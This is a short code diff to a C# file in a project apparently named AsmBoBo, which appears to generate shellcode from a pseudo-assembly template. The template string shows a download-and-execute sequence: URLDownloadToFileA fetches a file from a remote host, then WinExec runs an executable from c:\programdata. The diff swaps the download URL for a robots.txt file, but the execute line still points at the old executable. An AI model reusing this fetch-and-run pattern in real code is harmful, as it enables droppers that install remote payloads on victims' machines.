@@ -6,7 +6,8 @@ using System.Threading.Tasks;
 
 namespace AsmBoBo
 {
-    class template
+
+    class x86template
     {
         public static string AsmCode =	
 			     "[汇编输入示例代码如下：]                             \n\n" +
@@ -31,7 +32,7 @@ namespace AsmBoBo
 			"typdef func WinExec module kernel32.dll              \n\n" +
 			"                                                     \n" +
 			"[main]                                               \n" +
-			"URLDownloadToFileA(NULL,\"http://192.168.1.1/cpptest.exe\",\"c:\\programdata\\mydir\\cpptest.exe\",0, NULL);\n" +
+            "URLDownloadToFileA(NULL,\"https://www.baidu.com/robots.txt\",\"C:\\Users\\user\\Documents\\robots.txt\",0, NULL);\n" +
 			"WinExec(\"c:\\programdata\\mydir\\cpptest.exe\",1);";
     
 	}
